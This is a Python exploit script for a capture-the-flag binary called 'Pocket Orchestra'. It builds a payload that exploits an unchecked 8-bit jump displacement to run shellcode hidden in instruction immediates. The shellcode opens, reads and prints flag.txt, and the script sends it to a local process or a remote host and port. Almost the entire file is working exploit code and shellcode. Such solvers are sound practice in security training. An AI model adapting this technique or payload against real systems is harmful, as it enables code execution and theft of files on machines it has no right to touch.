#!/usr/bin/env python3
"""Pocket Orchestra exploit: Jcc rel8 truncation -> execution in SET immediates.
Usage: python3 solve_pocket_orchestra.py [HOST PORT]
Without HOST, launches local ELF in extracted give/ directory.
"""
import os
import re
import socket
import struct
import subprocess
import sys


def find_local_dir():
    base = os.path.dirname(os.path.abspath(__file__))
    override = os.environ.get('CHALLENGE_DIR')
    candidates = ([override] if override else [
        os.path.join(base, 'pwn_h_pocket_orchestra/give'),
        os.path.join(base, '../pwn_h_pocket_orchestra/give'),
        os.path.join(os.getcwd(), 'pwn_h_pocket_orchestra/give'),
        os.getcwd(),
    ])
    for path in candidates:
        if path and (os.path.isfile(os.path.join(path, 'challenge')) or
                     os.path.isfile(os.path.join(path, 'bin/challenge'))):
            return os.path.abspath(path)
    raise FileNotFoundError('No challenge found; set CHALLENGE_DIR to give/ or deploy/')

notes = []
def note(op, arg=0, imm=0):
    notes.append(struct.pack('<BBHQ',op,0,arg,imm & ((1<<64)-1)))

# Build ORW (openat/read/write/exit) shellcode. Each instruction may be at most 6 bytes,
# so it can be placed inside the 8-byte immediate of a SET note followed by "jmp +2".
instructions = [
    bytes.fromhex('48 83 ec 70'),  # sub rsp,0x70
    bytes.fromhex('48 83 ec 70'),  # sub rsp,0x70: keep read away from saved return addr
    bytes.fromhex('31 c0'),        # xor eax,eax
    bytes.fromhex('50'),           # push rax; null-terminator (upper 8 bytes)
    bytes.fromhex('50'),           # push rax; room for 8-byte path
    bytes.fromhex('b8 2e 74 78 74'),  # mov eax,'.txt'
    bytes.fromhex('89 44 24 04'),  # mov [rsp+4],eax
    bytes.fromhex('b8 66 6c 61 67'), # mov eax,'flag'
    bytes.fromhex('89 04 24'),     # mov [rsp],eax; ptr to "flag.txt\0"
    bytes.fromhex('48 89 e6'),     # mov rsi,rsp
    bytes.fromhex('bf 9c ff ff ff'), # mov edi,-100 (AT_FDCWD)
    bytes.fromhex('31 d2'),        # xor edx,edx (O_RDONLY)
    bytes.fromhex('b8 01 01 00 00'), # mov eax,257 (openat)
    bytes.fromhex('0f 05'),        # syscall
    bytes.fromhex('89 c7'),        # mov edi,eax (fd)
    bytes.fromhex('48 89 e6'),     # mov rsi,rsp
    bytes.fromhex('ba 80 00 00 00'), # mov edx,128
    bytes.fromhex('31 c0'),        # xor eax,eax (read)
    bytes.fromhex('0f 05'),        # syscall
    bytes.fromhex('89 c2'),        # mov edx,eax (read size)
    bytes.fromhex('bf 01 00 00 00'), # mov edi,1 (stdout)
    bytes.fromhex('b8 01 00 00 00'), # mov eax,1 (write)
    bytes.fromhex('0f 05'),        # syscall
    bytes.fromhex('b8 3c 00 00 00'), # mov eax,60 (exit)
    bytes.fromhex('31 ff'),        # xor edi,edi
    bytes.fromhex('0f 05'),        # syscall
]
chunks = []
block = b''
for inst in instructions:
    if len(block) + len(inst) > 6:
        chunks.append(block.ljust(6, b'\x90') + b'\xeb\x02')
        block = b''
    block += inst
chunks.append(block.ljust(6, b'\x90') + b'\xeb\x02')
assert len(chunks) <= 25, len(chunks)
# Initial RAX is zero; jz must jump into first embedded immediate at offset +2.
# The compiler uses an 8-bit displacement with no range check.
# Arrange offset[target] - offset[0+1] = 258 = 0x102, truncated to +2.
# 25 SET notes at 10 bytes each, plus 8 END (1 byte each), so target=count.
set_count = 25
padding_count = 8
note(6, 1 + set_count + padding_count)  # jz count, tests initial zero
for c in chunks:
    note(0, 0, int.from_bytes(c, 'little'))
for _ in range(set_count-len(chunks)):
    note(0, 0, int.from_bytes(b'\x90'*6 + b'\xeb\x02', 'little'))
for _ in range(padding_count):
    note(9)
assert len(notes) == 34
print(f'[+] Generated {len(chunks)} shellcode chunks, {len(notes)} total notes', file=sys.stderr)

command = b'load ' + b''.join(notes).hex().encode() + b'\n'
if len(sys.argv) >= 3:
    conn = socket.create_connection((sys.argv[1],int(sys.argv[2])))
    conn.settimeout(15)
    f = conn.makefile('rb', buffering=0)
    def recv(n): return f.read(n)
    def send(x): conn.sendall(x)
else:
    path = find_local_dir()
    proc = subprocess.Popen(['./challenge' if os.path.isfile(os.path.join(path,'challenge')) else './bin/challenge'], cwd=path, stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    def recv(n): return os.read(proc.stdout.fileno(),n)
    def send(x): proc.stdin.write(x); proc.stdin.flush()
def until(token):
    data = b''
    while not data.endswith(token):
        chunk = recv(1)
        if not chunk: raise EOFError(f'connection closed: {data!r}')
        data += chunk
    return data
print(until(b'score> ').decode('utf-8','replace'),end='')
send(command)
# shellcode should print flag then exit without returning to the interpreter
buf = b''
while True:
    x = recv(4096)
    if not x: break
    buf += x
print(buf.decode('utf-8','replace'))
assert b'vka{' in buf, 'flag was not printed'
